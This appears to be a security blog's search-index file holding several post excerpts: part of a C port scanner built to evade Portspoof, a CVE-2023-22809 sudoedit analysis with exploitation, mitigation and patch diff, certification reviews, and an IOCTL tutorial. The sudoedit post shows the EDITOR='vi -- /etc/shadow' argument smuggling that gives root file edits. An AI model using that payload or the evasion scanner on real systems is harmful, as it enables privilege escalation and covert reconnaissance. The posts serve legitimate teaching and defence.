&amp;&amp; errno == EAGAIN) {                 printf(\"[+] Port %d is open\\n\", port);             }         } else {             //printf(\"[+] Port %d is closed\\n\", port);         }         close(sock);     } }  int main() {     char host[256];     int start_port, end_port;     struct timeval timeout;     timeout.tv_sec = 5;         timeout.tv_usec = 0;     int scan_type;     printf(\"[+] N0Pspoof is a tool to bypass and evade Portspoof solution \\n\");     printf(\"[+] By: Zeyad Azima\\n\");     printf(\"[+] Github: https://github.com/Zeyad-Azima/N0Pspoof\\n\");     printf(\"\\n\");     printf(\"[+] Target Behind Portspoof: \");     scanf(\"%255s\", host);      printf(\"[+] Enter the start port: \");     scanf(\"%d\", &amp;start_port);     printf(\"[+] Enter the end port: \");     scanf(\"%d\", &amp;end_port);      printf(\"[+] Choose the scan type: \\n 1) TCP \\n 2) UDP \\n\");     scanf(\"%d\", &amp;scan_type);     printf(\"\\n\");                if (scan_type == 1) {         printf(\"[+] Scan Info:\\n[*] Target: %s\t[*] Ports Range: %d-%d\t[*] Scan Type: TCP\\n\", host, start_port, end_port);         TCP_scan(host, start_port, end_port, timeout);     } else if (scan_type == 2) {         printf(\"[+] Scan Info:\\n[*] Target: %s\t[*] Ports Range: %d-%d\t[*] Scan Type: UDP\\n\", host, start_port, end_port);         UDP_scan(host, start_port, end_port, timeout);     } else {         printf(\"Invalid scan type\\n\");     }     return 0;  }   You can also find the code on github.       Conclusion   Now, it’s time to compile our code using gcc and try it out.      Compile: gcc N0Pspoof.c -o N0Pspoof   We will perform scanning using nmap first &amp; then Our tool.           Nmap                           N0Pspoof             ","categories": ["Defense Evasion"],
        "tags": [],
        "url": "http://localhost:5000/defense%20evasion/portspoofexploit/",
        "teaser": "http://localhost:5000/assets/images/cld16nld9rzuy0jp87q41e835.png"
      },{
        "title": "CVE-2023-22809: Sudoedit Bypass - Analysis",
        "excerpt":"Introduction   A vulnerability was discovered by Synacktive in the sudo program and was published on January 18, 2023, known as CVE-2023-22809. This vulnerability leads to a security bypass in the sudoedit feature, allowing unauthorized users to escalate their privileges by editing files. This vulnerability affects versions of sudo from 1.8.0 through 1.9.12p1.       Testing Lab   For the testing lab, I will be using my normal Kali machine with an affected version of Sudo. The details are as follows   ┌──(kali㉿kali)-[~] └─$ sudo --version Sudo version 1.9.10 Sudoers policy plugin version 1.9.10 Sudoers file grammar version 48 Sudoers I/O plugin version 1.9.10 Sudoers audit plugin version 1.9.10       What is sudo ?   Sudo is a short for Superuser do, and it is a program used by Linux that allows a user with the proper permissions to execute commands on the actions or behavior of another user, typically root. Therefore, it can be used to give users permission to run a specific program or command without giving them high-level permissions, such as root.       How sudo Works ?   When a user tries to execute the sudo command, It first checks and verifies the user’s permissions at /etc/sudoers, which is the configuration file that contains a list of users and their corresponding permissions. This is used to determine which users are authorized to run specific commands as certain users, depending on the configurations. If the user is authorized to run the command using sudo, they will be asked to enter their password to confirm their identity before the command is executed with elevated privileges. Another way is if the user is listed in the sudoers file with the NOPASSWD option. This allows the user to run either one command or all commands as root without confirming a password.       The Analysis   As we explained briefly how sudo works, let’s take an in-depth look at what happens when it is run. According to synacktive, the sudoers plugin first calls the sudoers_policy_main() function, which is responsible for handling the lookup and validation of the policy using the sudoers_lookup() function. Now, let’s take a look at the sudoers_policy_main() function.       Note: The function is over 500 lines of code, therefore we will give an overview of it.       This function starts by taking the following arguments:   int sudoers_policy_main(int argc, char * const argv[], int pwflag, char *env_add[],     bool verbose, void *closure)           argc: Number of command-line arguments passed to the function.            argv: Array of command-line arguments passed to the function.            pwflag: Indicating whether the user’s password has been verified or no or the type of authentication.            env_add: Array of environment variables to add to the user’s environment when running the command.            verbose: Indicating whether verbose output should be generated.            closure: A pointer to any additional data passed to the plugin.               After taking all of these arguments The function first checks the user’s permissions by referring to the sudoers file, which contains a list of users and their respective permissions. If the user does not have permission to run the command, the function exits and sends an error message to the user. On the other hand, if the user is permitted to run the command, the function continues to execute it as the relevant user or group, using the setuid and setgid bit to temporarily acquire the user’s privileges. By reviewing the lines of the function, we can see the following line:   validated = sudoers_lookup(snl, sudo_user.pw, &amp;cmnd_status, pwflag);   The sudoers_lookup() is where the lookup happens to check the user’s permissions by taking the following arguments:           snl: Object that holds information about the sudoers file sources.            sudo_user.pw: User’s password from the struct sudo_user.            &amp;cmnd_status: Pointer to a variable that can be used to store information about the command or the authorization status.            pwflag: Indicating whether the user’s password has been verified or no or the type of authentication.               Then, the function will compare the user and the command they want to run with the defined rules in the sudoers file to check if the user is authorized and has the permissions to run the command or not. Inside the plugins/sudoers/parse.c file, we can see the sudoers_lookup() function code where all of that happens:   int sudoers_lookup(struct sudo_nss_list *snl, struct passwd *pw, int *cmnd_status,     int pwflag) {     struct defaults_list *defs = NULL;     struct sudoers_parse_tree *parse_tree = NULL;     struct cmndspec *cs = NULL;     struct sudo_nss *nss;     struct cmnd_info info;     int validated = FLAG_NO_USER | FLAG_NO_HOST;     int m, match = UNSPEC;     time_t now;     debug_decl(sudoers_lookup, SUDOERS_DEBUG_PARSER);      /*      * Special case checking the \"validate\", \"list\" and \"kill\" pseudo-commands.      */     if (pwflag)     debug_return_int(sudoers_lookup_pseudo(snl, pw, validated, pwflag));      /* Need to be runas user while stat'ing things. */     if (!set_perms(PERM_RUNAS))     debug_return_int(validated);      /* Query each sudoers source and check the user. */     time(&amp;now);     TAILQ_FOREACH(nss, snl, entries) {     if (nss-&gt;query(nss, pw) == -1) {         /* The query function should have printed an error message. */         SET(validated, VALIDATE_ERROR);         break;     }      m = sudoers_lookup_check(nss, pw, &amp;validated, &amp;info, &amp;cs, &amp;defs, now);     if (m != UNSPEC) {         match = m;         parse_tree = nss-&gt;parse_tree;     }      if (!sudo_nss_can_continue(nss, m))         break;     }     if (match != UNSPEC) {     if (info.cmnd_path != NULL) {         /* Update user_cmnd, user_stat, cmnd_status from matching entry. */         free(user_cmnd);         user_cmnd = info.cmnd_path;         if (user_stat != NULL)         *user_stat = info.cmnd_stat;         *cmnd_status = info.status;     }     if (defs != NULL)         (void)update_defaults(parse_tree, defs, SETDEF_GENERIC, false);     if (!apply_cmndspec(cs))         SET(validated, VALIDATE_ERROR);     else if (match == ALLOW)         SET(validated, VALIDATE_SUCCESS);     else         SET(validated, VALIDATE_FAILURE);     }     if (!restore_perms())     SET(validated, VALIDATE_ERROR);     debug_return_int(validated); }       So, what the function does behind the scenes is it checks for the special case of the validate, list, and kill pseudo-commands. Each one of them has a different usage, as follows:           validate: It’s used to check if a user has valid permissions to run a command. The function checks the sudoers file and verifies that the user is allowed to run the command.            list: It’s used to display a list of the privileges that a user has, Then the function use it to check the sudoers file and lists the commands that the user is allowed to run.            kill: It’s used to revoke privileges from a user, Then the function use it to check the sudoers file and revokes the privileges associated with the user.               And this part occurs within the sudoers_lookup_pseudo() function. At the end, when all checks have been done successfully, the user is cleared to proceed and can complete the command. Now, it is time to discuss sudoedit, which is a component of sudo and is primarily used for the same functionality as sudo. However, it is specifically used for securely editing files that require high levels of permissions, primarily those of the root user.   if (ISSET(sudo_mode, MODE_EDIT))       In the code above, which is a part of the sudoers_policy_main() function, the line checks if the sudo_mode is equal to MODE_EDIT. This indicates that the user wants to run an editor. The following line then:   safe_cmnd = find_editor(NewArgc - 1, NewArgv + 1, &amp;edit_argc, &amp;edit_argv, NULL, &amp;env_editor, false);       It saves the value of the find_editor() function in safe_cmnd to use later. As you can guess from the function name, it searches for an editor (by default, it's vi). If we go through the following part of the function code:   *env_editor = NULL;     ev[0] = \"SUDO_EDITOR\";     ev[1] = \"VISUAL\";     ev[2] = \"EDITOR\";     for (i = 0; i &lt; nitems(ev); i++) {     char *editor = getenv(ev[i]);      if (editor != NULL &amp;&amp; *editor != '\\0') {         *env_editor = editor;         editor_path = resolve_editor(editor, strlen(editor),         nfiles, files, argc_out, argv_out, allowlist);         if (editor_path != NULL)         break;         if (errno != ENOENT)         debug_return_str(NULL);     }     }       The above code looks for the editor in the environment variables SUDO_EDITOR, VISUAL, and EDITOR. Then, for each variable found, it will pass it to the resolve_editor() function, along with the number of files, etc.   if (nfiles != 0) { nargv[nargc++] = \"--\"; while (nfiles--) nargv[nargc++] = *files++; }       Anyway, When the resolve_editor() function resolves the editor’s path, it accepts extra arguments to be passed and separates them from the files in the original command-line using the -- as a separator. After that, it calls the sudo_edit() function and each argument is considered a filename due to the -- separator, as you can see in the following code:    /*      * The user's editor must be separated from the files to be      * edited by a \"--\" option.      */     for (ap = command_details-&gt;argv; *ap != NULL; ap++) {     if (files)         nfiles++;     else if (strcmp(*ap, \"--\") == 0)         files = ap + 1;     else         editor_argc++;       Exploitation   Now, In order to exploit this vulnerability, I have logged in as the user kali' on the machine. Let’s add the following rule to the /etc/sudoers file:   kali    ALL=(root) NOPASSWD: sudoedit /etc/services       This rule will allow the user kali to edit the /etc/services file without being prompted for a password. Moving on to the next step, let’s add the EDITOR variable to our environment variables and assign it the value vi -- /etc/shadow:                 Add Editor variable:   export EDITOR=\"vi -- /etc/shadow\"   Let’s run sudo -l and you will be able to see that our rule has been applied.          By running sudoedit /etc/services it will execute vi on /etc/shadow file also.                 command-line output:          So, As a Re-Cap what happened is:   1- User has permissions to edit /etc/services   2- User defined a crafted editor environment-variable vi -- /etc/shadow   3- When sudo executed and matched MODE_EDIT it will lookup for the editor in the 3 known environment-variables SUDO_EDITOR, VISUAL, and EDITOR.   4- As the resolve_editor() function resolves the editor’s path, It accepts extra arguments to be passed and separates them from the files in the original command-line using the -- as a separator. After that, it calls the sudo_edit() function and each argument is considered a filename due to the -- separator, Therefore, It will take the extra argument which is /etc/shadow file to be edited.       Mitigation   To prevent this vulnerability, we will add environment variables to the denial list using the env_delete in /etc/sudoers as follows:   Defaults!SUDOEDIT       env_delete+=\"SUDO_EDITOR VISUAL EDITOR\" Cmnd_Alias SUDOEDIT = sudoedit /etc/services kali    ALL=(root) NOPASSWD: SUDOEDIT       Now, if we run sudo -l we can see the following and our new rule applied:                  Trying after mitigation:                          And, Finally you can also update to the last version of sudo, Which is patched. Just by running apt install sudo.               Trying after update:              Patch Diffing   Now, Coming to the patch part, We can see here the commit made to the code on github https://github.com/sudo-project/sudo/commit/0274a4f3b403162a37a10f199c989f3727ed3ad4. There are 3 files got changed which are editor.c, sudoers.c and visudo.c. Let’s explain the changes in each file:       editor.c   change no.1      Before change           if (find_path(editor, &amp;editor_path, &amp;user_editor_sb, getenv(\"PATH\"), NULL,     0, allowlist) != FOUND) { sudoers_gc_remove(GC_PTR, editor); free(editor); errno = ENOENT;       The code is a condation if the editor not found it will call sudoers_gc_remove() function and then use the free() function to free up any memory associated with the editor variable. Finally, set errno to ENOENT.          After change   if (find_path(editor, &amp;editor_path, &amp;user_editor_sb, getenv(\"PATH\"), NULL,     0, allowlist) != FOUND) {     goto bad;     }       You can see in the after change code it makes the code jump to bad which defined before in the code. As we can see from the commit that it doesn’t want the errno be equal toENOENT which means No such file or directory.       Change no.2   In this change the following code added:   if (strcmp(nargv[nargc], \"--\") == 0) {         sudo_warnx(U_(\"ignoring editor: %.*s\"), (int)edlen, ed);            sudo_warnx(\"%s\", U_(\"editor arguments may not contain \\\"--\\\"\"));         errno = EINVAL;         goto bad;     }   Basically, the code checks for the -- in the editor variables, If it’s exist it will not work (And we can see it in the mitigation above).       sudoers.c   Change      Before change   if (errno != ENOENT) audit_failure(NewArgv, N_(\"%s: command not found\"),         env_editor ? env_editor : def_editor);         sudo_warnx(U_(\"%s: command not found\"),         env_editor ? env_editor : def_editor);         goto bad;       The statment here checks if the error is not euqal to ENOENT. Then it will call the audit_failure() function and then sudo_warnx() function to log the error and display a warning message. After that jump to bad which will handle the error.          After change   switch (errno) {         case ENOENT:         audit_failure(NewArgv, N_(\"%s: command not found\"),             env_editor ? env_editor : def_editor);         sudo_warnx(U_(\"%s: command not found\"),             env_editor ? env_editor : def_editor);         goto bad;         case EINVAL:         if (def_env_editor &amp;&amp; env_editor != NULL) {             /* User tried to do something funny with the editor. */             log_warningx(SLOG_NO_STDERR|SLOG_AUDIT|SLOG_SEND_MAIL,             \"invalid user-specified editor: %s\", env_editor);             goto bad;         }         FALLTHROUGH;         default:         goto done;       In this switch we have 2 cases:           First: If errno is set to ENOENT it will call the audit_failure() function and then sudo_warnx() function to log the error and display a warning message.            Second: If errno is set to EINVAL and the user has attempted to do something with the editor, Then it will call the audit_failure() function and then sudo_warnx() function to log the error and display a warning message.    Finally, If there is no case of the 2 cases occures it will jump to done, Which defined before in the code and indicating to success of the process.           visudo.c   Change      Before Change   if (editor_path == NULL) {     if (def_env_editor &amp;&amp; env_editor != NULL) {         sudo_fatalx(U_(\"specified editor (%s) doesn't exist\"), env_editor);      After change   if (errno == ENOENT) {         sudo_warnx(U_(\"specified editor (%s) doesn't exist\"),             env_editor);         }         exit(EXIT_FAILURE);   Here we can see that the old code replaced with more secure error handling way for $EDITOR and exit safely.       Conclusion   My final words are to do your upgrade better cause as there is a vulnerable version it’s possiable to bypass the rules in the sudoers file. Therefore, keep all of your softwares updated. And also add the above suders rules also to your /etc/sudoers file as another layer of security. In summary, the root cause is the presence of the -- argument to determine the list of files to edit can be included in environment variables without any validation.  ","categories": ["Security Research"],
        "tags": [],
        "url": "http://localhost:5000/security%20research/CVE_2023_22809/",
        "teaser": "http://localhost:5000/assets/images/cldfolqy51m8g0jp8837satgc.png"
      },{
        "title": "eMAPT & Mobile Apps/Sec Guide",
        "excerpt":"Introduction   On May 23rd, 2022, I successfully passed my eMAPT exam from eLearnsecurity. Whenever I strive to obtain a certification, I always follow a set of steps to ensure a thorough understanding of the topic. These steps are:      Understanding and learning the topic as a developer or IT professional.   Applying and practicing the topic through building applications, for instance.   Learning and applying the security aspect of the topic.   In this blog, I will provide an honest review of the eMAPT course and exam, as well as offer a guide for mobile application security.   You can join the eMAPT Telegram group from the following link: https://t.me/+pBYo2XBMfa5hNGFk   Course Content   The eMAPT course content was simple and not too bad, so it does not require a lot of description. However, there were some parts that were not clear, particularly in the early modules. If you are a beginner or someone with no prior knowledge, you will learn a lot, but if you have previous experience, you may not learn as much. The course covers both major mobile computing platforms, Android and iOS, starting with the OS architecture, followed by the setup of the necessary environment for the course. The course then moves on to the application building process and discusses how to hack each OS, either through rooting Android or jailbreaking iOS. Finally, the course covers vulnerabilities and security issues that can affect applications on both platforms, as well as how to test for these issues through static and dynamic analysis. Overall, the content is simple and easy to understand.   The Exam   For the exam, it is important to have both development and security knowledge related to the topic. You will be tested on your ability to develop applications, identify specific security vulnerabilities, and create an app that exploits these vulnerabilities. ==Note that there are no iOS apps included in the exam==, but if you have the necessary equipment such as a Mac and iPhone, it is recommended that you study iOS development specifically.   Mobile App/Sec Guide   The most important than the certificate itself is to build the knowledge and the skills of the topic. So let’s move on with this guide that i put it from my view you don’t have to fully follow it, But i explained each part to make everything clear from my point of view:   How to enhance your skills, knowledge &amp; also prepar for the eMAPT ?   Before learn how to hack the thing, learn the thing, do the thing and then hack the thing   So, first is the basics of the both Android &amp; IOS with development &amp; security also pentest.   So, we will start with the basics from TCM-Academy that course will give you some basic knowledge and skills about the Android &amp; IOS both from the security &amp; pentesting side. So, you will be able to understand the up coming courses from the security side and increase your mindset from the security side more.   Tcm-Academy link: https://academy.tcm-sec.com/p/mobile-application-penetration-testing   Second step is to study the eMAPT course materials but when we reach the Application fundamentals module we go to the development in Android or IOS depending on the section you are studying And here are two courses that i do recommend for the development:   Android Development: https://www.udemy.com/course/android-development-and-android-application-hacking/   IOS Development: https://www.udemy.com/course/iphone-developer-course/   You can also look for the development resources that you see its good for you.   Now you can complete the eMAPT course &amp; learning materials, And after that we will do the following:   As we know the mobile apps pentesting is divided into 2 thing, first the static analysis part which is for reverse engineering the application and reading the code for understanding and spotting some vulnerabilities or hardcoded credentials, etc.. &amp; the second part is dynamic analysis which is the part for testing the application in the runtime such as looking for insecure data storing, some leaks &amp; network traffic and many more.      Static Analysis courses: The following 2 courses are focused on static analysis more and vulnerabilities such as Owasp Mobile Top 10, how to use drozer &amp; have a small part about exploit development on the mobile apps libraries.   Android: https://insectechs.usefedora.com/p/android-application-penetration-testing-7536   IOS: https://insectechs.usefedora.com/p/ios-application-penetration-testing-ethical-hacking-domain-7542      Dynamic Analysis:   Now, after you have done your static analysis and understand the logic of the app let’s go for the dynamic analysis part. In this part you run the application and start to analysis the behaviour of the app, network flaw and trying to exploit the behaviour and other flaws that happen during the runtime.   Android: https://www.udemy.com/course/hacking-and-pentesting-android-applications/   IOS: https://www.udemy.com/course/hacking-and-pentesting-ios-applications/   Now we can say that we have fill most of the gaps that could happen to us and if you want to go more deeper and advance your level. You can start to read the books and the books are divided into 2 parts, The first part related to the applications itself and the second part related to exploit development in terms of exploitation to something like native C/C++ libraries that used in the applications and so on.   First part Focusing on Applications:   OWASP Mobile Security Testing Guide: https://owasp.org/www-project-mobile-security-testing-guide/   Mobile Application Penetration Testing: https://www.amazon.com/Mobile-Application-Penetration-Testing-Vijay-ebook/dp/B019IOX4Y2/   the following book focuses more on applications and it has a part about exploit development in native libraries.   The Mobile Application Hacker’s Handbook: https://www.amazon.com/Mobile-Application-Hackers-Handbook/dp/1118958500/   Second part Focusing on Exploit Development:   This is especially for the exploit development section. These books explain the internals of mobile operating systems such as Android &amp; iOS, and they are divided into two parts. The first part focuses on in-depth analysis and understanding of the operating systems, how they work, and their architecture. The second part focuses more on exploit development.   The first book helps you understand mobile operating systems in a more in-depth and broad way through digital forensic analysis: Practical Mobile Forensics: https://www.amazon.com/Practical-Mobile-Forensics-hands-mastering/dp/1788839196   This is the second section, which focuses more on exploit development:   Android Hacker’s Handbook: https://www.amazon.com/Android-Hackers-Handbook-Joshua-Drake/dp/111860864X/   iOS Hacker’s Handbook: https://www.amazon.com/iOS-Hackers-Handbook-Charlie-Miller/dp/1118204123/   Conclusion  Don’t forget to conduct your own research and read articles/blogs. Additionally, there is a distribution built on Ubuntu called Mobexler which is a mobile app security and pentesting distribution. It comprises all the tools and frameworks necessary for mobile app pentesting. There is also a checklist available for both Android and iOS app pentesting that you can follow   Download link: https://lnkd.in/gTunVyXW   Checklist link: https://lnkd.in/gbKAgxir   Used Tools: https://lnkd.in/gkZDDKas  ","categories": ["Certificates"],
        "tags": [],
        "url": "http://localhost:5000/certificates/empat/",
        "teaser": "http://localhost:5000/assets/images/2e95be77ea50644e2f92df6305998342.png"
      },{
        "title": "Introduction to IOCTL (Input/Output CONTROL)",
        "excerpt":"Introduction   In this blog, We will be discussing the Basics of `IOCTL (Input/Output CONTROL)`, What is it ?, The modes types, What is it used for ? and I will show an example of sending an IOCTL Request. But, before we moving further with all of this we need to understand the User Mode and the Kernel Mode.   The Modes   Basically, The modes word itself referring to the different states of operation &amp; different levels of privilege that the system or a software could run. In general, each mode different from the other and operate differently with different privileges and access levels &amp; the main 2 modes we have and will talk about is User Mode&amp;Kernel Mode.   What is User Mode ?   The User Mode is the mode which the levels of operations &amp; privileges are restricted and limited in access &amp; permissions. So, the software or any program running in the User Mode or inside it, Won’t be able to perform certain operations that could be malicious or harmful to other softwares and the system. In short, User Mode is a non-privileged mode where it can’t access the hardware resources or any low level operations directly. For example, A malware running in the User Mode can’t access or modify the CPU instructions cause if this happened the malware easly will have an elevated privileges and as it’s on the hardware. Therefore, It’s the highest privileges you can get and u won’t have any restriction.   What is Kernel Mode ?   The Kernel Mode is a non-restricted mode where you can access the hardware resources directly where you will be able to manage any related resources such as CPU &amp; Memory and perform any low level operations easily. For example, any one get access to the Kernel Mode will be able to manipulate the resources easily and can also escalate privileges which could happen through a vulnerability or any misconfigurations. In short, The Kernel Mode opposite to the User Mode and each of one has different levels of operations &amp; levels of privileges.   Input/Output Control (IOCTL)   IOCTL is short for “Input/Output Control” which is a system call used for input/output operations and communications from the User Mode to the Kernel Mode drivers. Basically, It allows the components in the User Mode for example a software to communicate and control the behaviour of a device driver in Kernel Mode.   IOCTLs   The IOCTLs are a set of codes and each one of these codes has a specific job to be used in and perform. For example:      IOCTL_DISK_GET_LENGTH_INFO: This IOCTL code is used to retrieve the length of a disk partition.   IOCTL_VIDEO_QUERY_SUPPORTED_BRIGHTNESS: This IOCTL code is used to query the supported brightness levels of a display.   IOCTL_SERIAL_SET_BAUD_RATE: This IOCTL code is used to set the baud rate of a serial port.   IOCTL_CDROM_GET_LAST_SESSION: This IOCTL code is used to retrieve information about the last session on a CD-ROM.   IOCTL_STORAGE_QUERY_PROPERTY: This IOCTL code is used to retrieve information about a storage device.   IOCTL_MOUSE_GET_ATTRIBUTES: This IOCTL code is used to retrieve the attributes of a mouse device.   IOCTL_KEYBOARD_SET_TYPEMATIC: This IOCTL code is used to set the typematic rate of a keyboard.   IOCTL_SMARTCARD_TRANSMIT: This IOCTL code is used to send a command to a smart card reader.   IOCTL_USB_GET_DESCRIPTOR_FROM_NODE_CONNECTION: This IOCTL code is used to retrieve a USB descriptor from a USB device.   IOCTL_NDIS_QUERY_GLOBAL_STATS: This IOCTL code is used to query global statistics for a network adapter.   Those where example for the IOCTLs you can find all the IOCTL codes you need from Here.   How IOCTL works ?   When the apps or the components in the User Mode wants to query information of a device driver in the Kernel Mode. It sends a request known as IOCTL request, The IOCTL requests are made &amp; sent using the DeviceIoControl() which is a windows API function.      When the the DeviceIoControl() function gets called it is actually implemented by calling another function which is NtDeviceIoControlFile() resides in the ntdll.dll, Then the IOCTL request sent to the device driver. There are 4 buffering methods that can be used with the IOCTL request which are:      METHOD_BUFFERED: Copies the input and output buffers to and from the driver through an intermediate system buffer.   METHOD_IN_DIRECT: Its used when the input buffer is large and will not fit in the intermediate system buffer. In this case, the input buffer is mapped directly into the driver’s address space.   METHOD_OUT_DIRECT: In case the output buffer is large and will not fit in the intermediate system buffer. In this case, the output buffer is mapped directly into the driver’s address space.   METHOD_NEITHER: When the input and output buffers are not contiguous and cannot be mapped into a single buffer. The driver and application exchange pointers to the separate input and output buffers.   Note: If you wondering at which part the user get’s a Kernel Mode access. Basically, there are 2 functions/syscalls used which are kifastsystemcall and kifastsystemcallret and both are kernel functions that provide a mechanism for making syscalls from user mode to kernel mode. The kifastsystemcall function takes the parameters for a syscall and makes the transition from user mode to kernel mode using a secret number called syscall gate (which grants the Kernel Mode access) and the parameters onto the stack. Then it makes a syscall instruction to trigger the kernel to execute the syscall. And the kifastsystemcallret function is used to return from the syscall back to the User Mode by passing the return address of the User Mode code which is stored on the stack during the syscall.   Sending IOCTL Request   To understand the IOCTL request we will do in a clearly way, The DeviceIoControl() function structure is as the following:   BOOL DeviceIoControl(   HANDLE       hDevice,   DWORD        dwIoControlCode,   LPVOID       lpInBuffer,   DWORD        nInBufferSize,   LPVOID       lpOutBuffer,   DWORD        nOutBufferSize,   LPDWORD      lpBytesReturned,   LPOVERLAPPED lpOverlapped );   each parameter in the function represents as the following:      hDevice: It’s a handle to the device thatwill be used to perform the operation.   dwIoControlCode: The IOCTL code that identifies the operation to be performed.   lpInBuffer: A pointer to the input buffer that contains the data required to perform the operation.   nInBufferSize: The size of the input buffer.   lpOutBuffer: A pointer to the output buffer that receives the data returned by the operation.   nOutBufferSize: The size of the output buffer.   lpBytesReturned: A pointer to the number of bytes returned by the operation.   lpOverlapped: A pointer to an OVERLAPPED structure that is used for asynchronous operations.   Note: the data size is in bytes &amp; the Asynchronous operations is an operation that allows the software to continue executing while waiting for a potentially long-running operation to be completed and the OVERLAPPED structure is used to manage these operations.   Now, It’s the time to send our IOCTL request and i will be using the IOCTL_DISK_GET_DRIVE_GEOMETRY_EX code which retrieves extended information about the physical disk’s geometry like the type, number of cylinders, etc.   IOCTL request Code:   #include &lt;stdio.h&gt; #include &lt;windows.h&gt; #include &lt;winioctl.h&gt;  int main() {   HANDLE hDevice;   DWORD dwIoControlCode;   BOOL bResults;   DWORD dwBytesReturned;   DISK_GEOMETRY_EX diskGeometry;    hDevice = CreateFileW(L \"\\\\\\\\.\\\\PhysicalDrive0\", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);   dwIoControlCode = 0x000700A0;   bResults = DeviceIoControl(hDevice, dwIoControlCode, NULL, 0, &amp; diskGeometry, sizeof(diskGeometry), &amp; dwBytesReturned, NULL);    if (hDevice == INVALID_HANDLE_VALUE) {     printf(\"Handling the device drive faild\");     exit(0);   } else if (bResults == FALSE) {     printf(\"IOCTL request faild\");     CloseHandle(hDevice);     exit(0);   } else {      printf(\"Disk size: %llu bytes\\n\", diskGeometry.DiskSize.QuadPart);     CloseHandle(hDevice);    }    return 0; }   Now, The above code is the one we will use to send the IOCTL Request, Let’s explain it. First, We included the needed header files that contains the needed functions &amp; methods we will use which are:      stdio.h: Which is used for the standard input/output and contains functions such as printf()   windows.h: Which provides us with the Windows APIs as the CreateFileW() we used in the code.   winioctl.h: Which contains the IOCTL codes and let us perform the IOCTL Request.   After that we defined some variables in the main() function and each one of them has a role as the following:      HANDLE hDevice: We declared hDevice as a HANDLE object which used to access and manipulate system resources in our case it’s the device drive.   DWORD dwIoControlCode: Here we declared dwIoControlCode as a DWORD data type where we gonna store the IOCTL code.   BOOL bResults: Declared the bResults variable as a Boolean data type to store the result of DeviceIoControl() function call.   DWORD dwBytesReturned: Here we declared dwBytesReturned as a DWORD data type which we wll use to store the bytes returned by DeviceIoControl() function.   DISK_GEOMETRY_EX diskGeometry: declaring diskGeometry variable as a DISK_GEOMETRY_EX data type variable that will store the disk geometry information retrieved by the DeviceIoControl().   It’s the time now to assign and use these variables and initial our IOCTL request in the following lines of code:   hDevice = CreateFileW(L\"\\\\\\\\.\\\\PhysicalDrive0\", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);   Here we used the CreatFileW() Windows API which generally it’s used to create and open files on disk. But, it’s also can be used to open the device drive. The function takes some values as parameters:      L\"\\\\\\\\.\\\\PhysicalDrive0\": Here is device drive and PhysicalDrive0 indicates to the first hard disk drive &amp; the \\\\\\\\.\\\\ is used to communicating with localhost.   GENERIC_READ | GENERIC_WRITE: Specifies the access mode for the handle.   FILE_SHARE_READ | FILE_SHARE_WRITE: Specifies how the handle can be shared with other processes.   NULL: This is the security attributes. We set it to NULL for default security.   OPEN_EXISTING: Specifies that the function should open an existing file   FILE_ATTRIBUTE_NORMAL: Specifies that the file should have no other attributes set.   NULL: A template file that we don’t need.   Next we assign the IOCTL code which is 0x000700A0 to the dwIoControlCode variable. The 0x000700A0 hex code refers to IOCTL_DISK_GET_DRIVE_GEOMETRY_EX. After that we called the DeviceIoControl() and assign it to bResults variable.   bResults = DeviceIoControl(hDevice, dwIoControlCode, NULL, 0, &amp;diskGeometry, sizeof(diskGeometry), &amp;dwBytesReturned, NULL);   And as we can see the DeviceIoControl() takes some parameters and we have explained the structure of it above.   if (hDevice == INVALID_HANDLE_VALUE) {     printf(\"Handling the device drive faild\");     exit(0);   } else if (bResults == FALSE) {     printf(\"IOCTL request faild\");     CloseHandle(hDevice);     exit(0);   } else {      printf(\"Disk size: %llu bytes\\n\", diskGeometry.DiskSize.QuadPart);     CloseHandle(hDevice);   }   Finally, Here we check for errors to handle such as INVALID_HANDLE_VALUE which indicates that the handling value is invalid and in the second conditionit checks if the returned boolean of DeviceIoControl() that stored in bResults False or no, If False that means the operation didn’t done successfully. If the both of the 2 condations aren’t true that means everything goes well and will get us the disk size using diskGeometry.DiskSize.QuadPart and print it. At the end will close the Handle we created. Now, I am using CodeBlocks to write and execute the code.   Running The code   First, I will put a random name to handle. Therefore, it will result in an error:      You can see that the error has been handled. This time i will run the code normally with no problems:      And here is the disk size with no issues. If we opened Procmon or Process Monitor and run our code after compiling it, We will be able to see the process very clearly.      As we can see in the screen shot clearly we can see all the operations done by the compiled code process from the start going through the calls and so on, Until the process exit.   Conclusion   Now, we know what is IOCTL (Input/Output CONTROL) and how it works &amp; This was just a basic introduction to the **IOCTL (Input/Output CONTROL)** and in the coming parts we will be diving deep by showing more examples &amp; Reverse Engineer a driver and Identifying the IOCTL and extracting IOCTL codes and many more.  ","categories": ["General"],
        "tags": [],
        "url": "http://localhost:5000/general/ioctl/",
        "teaser": "http://localhost:5000/assets/images/37c839ce7f03af08132d6fd32f3a67cb.png"
      },{
        "title": "eCPPT: The Honest Review",
        "excerpt":"Introduction  On February 4th, 2022, I successfully passed the eCPPT exam from eLearnsecurity and obtained the certification. Prior to this, I had previous experience with penetration testing and was already working as a penetration tester. In this blog, I will be providing my honest opinion on the course and exam.   Course Content  The course content was overall good, in my opinion. It was filled with a lot of information and knowledge to learn. However, there were some cons that I did not like. Specifically, in some sections of the course, certain points were not explained clearly or completely, and were more like definitions or short sentences. Despite this, the overall content was good and anyone can learn new things, whether they have previous knowledge or not. The section that I particularly liked in the course was the “Network Security” section, as it was the longest and biggest section in terms of content. It covered a lot of different types of attacks and techniques that can be used for penetration testing on networks, both internally and externally. I also appreciated the inclusion of sections on “Wireless Security” and “Metasploit &amp; Ruby,” as these topics are not covered as frequently and are important for a penetration tester to know, as you may encounter wireless networks during engagements or projects. However, the course does not cover any content on attacking active directory, but that is included in the eCPTX certificate course content.   If I were to make some recommendations for preparing for the exam, I would suggest reading the following books:     “Penetration Testing with Shellcode”   “The Hacker Playbook 2” (which contains information on active directory).   Additionally, I would recommend going through the “Tryhackme” learning paths such as the “Jr Penetration Tester” path and the “Offensive Security” path. You will notice that the “Offensive Security” path also covers active directory, as does “The Hacker Playbook 2.” The reason I recommend this is because active directory is widely used in the majority of environments around the world and it is necessary to know about it.   The Exam  Now, coming to the exam part. The exam was pretty easy and will be easy even if you didn’t have any previous experiance with penetration testing as the exam was not providing everything you learn in the content which i see that it’s another thing under the cons. It will be enough for you to study the content and solve the labs. And at the end i would recommand the course 